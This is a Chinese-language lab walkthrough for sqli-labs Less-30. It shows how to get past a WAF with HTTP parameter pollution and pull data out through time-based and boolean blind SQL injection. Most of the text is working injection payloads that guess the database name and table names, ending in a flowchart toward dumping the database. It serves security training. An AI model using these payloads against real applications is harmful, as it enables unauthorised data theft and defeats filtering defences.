# Less-30 HPP + 盲注组合绕过

## 核心原理

Less 30 = Less 29 的 HPP 结构 + 无回显（盲注）
- WAF 检查第一个 `id` 参数
- 后端取最后一个 `id` 参数
- 页面不回显数据 → 需盲注

## 绕过步骤

### 第一步：确认 HPP 可用
```sql
?id=1&id=-1' union select 1,2,3--+
```
如果报错变化或延时，说明参数传递成功。

### 第二步：时间盲注
```sql
-- 判断注入点
?id=1&id=1' and sleep(3)--+

-- 二分法猜数据库名长度
?id=1&id=1' and if(length(database())=8,sleep(2),0)--+

-- 逐个字符猜解（二分法）
?id=1&id=1' and if(ascii(substr(database(),1,1))>115,sleep(2),0)--+  -- 是 s
?id=1&id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+  -- 确认
```

### 第三步：批量猜表名
```sql
-- 猜第一个表的第一个字符
?id=1&id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(2),0)--+
```

## 布尔盲注模板

如果页面有 True/False 差异（比如 id=1 正常，id=2 不正常）：

```sql
-- 布尔盲注
?id=1&id=1' and substr(database(),1,1)='s'--+    -- 页面正常
?id=1&id=1' and substr(database(),1,1)='x'--+    -- 页面异常
```

## 完整盲注流程图

```
确认注入 → 判断库长 → 猜库名 → 猜表数 → 猜表长 → 猜表名 → 猜列数 → 猜列名 → 脱裤
```
